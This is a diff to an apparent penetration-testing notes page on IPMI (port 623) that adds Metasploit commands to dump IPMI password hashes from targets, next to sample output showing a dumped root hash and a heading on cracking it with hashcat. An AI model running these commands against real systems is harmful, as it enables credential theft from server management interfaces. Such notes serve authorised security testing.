@@ -1,4 +1,4 @@
-# IPMI
+# 623 - IPMI
 
 ### Crack IPMI hash with hashcat
 
@@ -82,4 +82,12 @@ msf auxiliary(ipmi_dumphashes) > run
  
 
 [+] 10.0.1.100 root:ee33c2e02700000....000000000000000000000000000000001404726f6f74:8c576f6532 356cc342591204f41cc4eab7da6e8a
+```
+
+### Dump hashes
+
+```
+use auxiliary/scanner/ipmi/ipmi_dumphashes 
+set rhosts [TARGETS] 
+run
 ```
